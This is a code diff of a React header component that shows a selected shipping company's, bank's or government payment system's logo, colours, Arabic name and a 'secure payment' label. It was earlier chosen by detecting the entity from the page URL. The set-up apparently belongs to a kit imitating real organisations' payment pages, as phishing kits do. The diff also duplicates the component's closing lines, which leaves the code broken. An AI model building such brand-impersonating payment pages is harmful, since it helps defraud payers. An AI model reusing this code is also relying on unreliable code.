@@ -1,10 +1,10 @@
 import React from 'react';
 import { ArrowLeft } from 'lucide-react';
 import { useNavigate } from 'react-router-dom';
-import { getServiceBranding } from '@/lib/serviceLogos';
-import { shippingCompanyBranding, bankBranding } from '@/lib/brandingSystem';
+import { getBrandingByCompany } from '@/lib/brandingSystem';
 import { getGovernmentPaymentSystem } from '@/lib/governmentPaymentSystems';
-import { detectEntityFromURL, getEntityLogo } from '@/lib/dynamicIdentity';
+import { getEntityLogo } from '@/lib/dynamicIdentity';
+import { isGovernmentService } from '@/lib/governmentPaymentServices';
 import CompanyHero from '@/components/CompanyHero';
 
 interface BrandedTopBarProps {
@@ -27,31 +27,29 @@ const BrandedTopBar: React.FC<BrandedTopBarProps> = ({
   showHero = false
 }) => {
   const navigate = useNavigate();
-  const branding = getServiceBranding(serviceKey);
-  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
-  const selectedBankBranding = bankId ? bankBranding[bankId] : null;
-  const govSystem = countryCode ? getGovernmentPaymentSystem(countryCode) : null;
-
-  const detectedEntity = detectEntityFromURL();
-  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
-
-  // Priority: Bank branding > Government system > Company branding
-  const activeBranding = selectedBankBranding || (serviceKey === 'payment' && govSystem ? {
-    colors: govSystem.colors,
-    fonts: { arabic: govSystem.fonts.primaryAr, primary: govSystem.fonts.primary, secondary: govSystem.fonts.secondary },
-    gradients: govSystem.gradients,
-    shadows: govSystem.shadows,
-    borderRadius: govSystem.borderRadius
-  } : companyBranding);
   
-  const primaryColor = activeBranding?.colors.primary || branding.colors.primary;
-  const secondaryColor = activeBranding?.colors.secondary || branding.colors.secondary;
+  const isGovService = isGovernmentService(serviceKey) || serviceKey === 'government_payment' || serviceKey === 'payment';
+  const companyBranding = getBrandingByCompany(serviceKey.toLowerCase());
+  const govSystem = isGovService && countryCode ? getGovernmentPaymentSystem(countryCode) : null;
+  
+  const activeBranding = companyBranding || (govSystem ? {
+    colors: govSystem.colors,
+    fonts: { 
+      arabic: govSystem.fonts.primaryAr, 
+      primary: govSystem.fonts.primary, 
+      secondary: govSystem.fonts.secondary 
+    },
+    gradients: govSystem.gradients,
+    nameAr: govSystem.nameAr,
+    logoUrl: govSystem.logo,
+  } : null);
+  
+  const primaryColor = activeBranding?.colors.primary || '#0066B2';
+  const secondaryColor = activeBranding?.colors.secondary || '#004B87';
   const gradient = activeBranding?.gradients?.primary || `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`;
-
-  const displayLogo = entityLogo || 
-                      ((govSystem?.logo && serviceKey === 'payment') ? govSystem.logo : branding.logo);
-
-  const isShippingService = Boolean(companyBranding);
+  
+  const displayLogo = activeBranding?.logoUrl || getEntityLogo(serviceKey);
+  const displayName = activeBranding?.nameAr || serviceName;
 
   const handleBack = () => {
     if (backPath) {
@@ -68,46 +66,40 @@ const BrandedTopBar: React.FC<BrandedTopBarProps> = ({
         style={{
           background: gradient,
           borderBottom: `2px solid ${primaryColor}`,
-          boxShadow: '0 4px 12px rgba(0,0,0,0.1)'
         }}
       >
         <div className="container mx-auto px-4">
           <div className="flex items-center justify-between h-14 sm:h-16">
-            {/* Right side - Service Name */}
             <div className="flex items-center gap-3 sm:gap-4">
               {displayLogo && (
-                <div
-                  className={`rounded-lg px-2 py-1 ${isShippingService ? 'bg-transparent' : 'bg-foreground/10 backdrop-blur-sm border border-white/20'}`}
-                >
+                <div className="bg-white/95 backdrop-blur-sm rounded-lg px-3 py-2 border border-white/30">
                   <img
                     src={displayLogo}
-                    alt={serviceName}
-                    className="h-8 sm:h-10 w-auto object-contain"
+                    alt={displayName}
+                    className="h-7 sm:h-9 w-auto object-contain"
+                    onError={(e) => {
+                      e.currentTarget.style.display = 'none';
+                    }}
                   />
                 </div>
               )}
               <div className="text-white">
                 <h2 
-                  className="text-xl sm:text-2xl font-bold leading-tight"
-                  style={{ fontFamily: activeBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
+                  className="text-lg sm:text-xl font-bold leading-tight"
+                  style={{ fontFamily: activeBranding?.fonts?.arabic || 'Cairo, Tajawal, sans-serif' }}
                 >
-                  {serviceName}
+                  {displayName}
                 </h2>
-                <p 
-                  className="text-xs sm:text-sm opacity-90"
-                  style={{ fontFamily: activeBranding?.fonts.primary || 'Arial, sans-serif' }}
-                >
-                  الدفع الآمن - Secure Payment
+                <p className="text-xs opacity-90">
+                  الدفع الآمن
                 </p>
               </div>
             </div>
 
-            {/* Left side - Back button */}
             {showBackButton && (
               <button
                 onClick={handleBack}
                 className="flex items-center gap-2 text-white hover:bg-white/10 px-3 sm:px-4 py-2 rounded-lg transition-all"
-                style={{ fontFamily: activeBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif' }}
               >
                 <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5" />
                 <span className="text-sm sm:text-base font-medium">رجوع</span>
@@ -116,7 +108,6 @@ const BrandedTopBar: React.FC<BrandedTopBarProps> = ({
           </div>
         </div>
 
-        {/* Optional bottom gradient line for depth */}
         <div 
           className="h-1 w-full"
           style={{
@@ -125,14 +116,16 @@ const BrandedTopBar: React.FC<BrandedTopBarProps> = ({
         />
       </div>
 
-      {/* Company Hero - shown when showHero is true and company has branding */}
       {showHero && companyBranding && (
-        <div className="w-full bg-gradient-to-b from-gray-50 to-white py-6">
+        <div className="w-full bg-secondary/20 py-6">
           <div className="container mx-auto px-4">
-            <CompanyHero serviceKey={serviceKey} />
+            <CompanyHero serviceKey={serviceKey} countryCode={countryCode} />
           </div>
         </div>
       )}
+    </>
+  );
+};
     </>
   );
 };
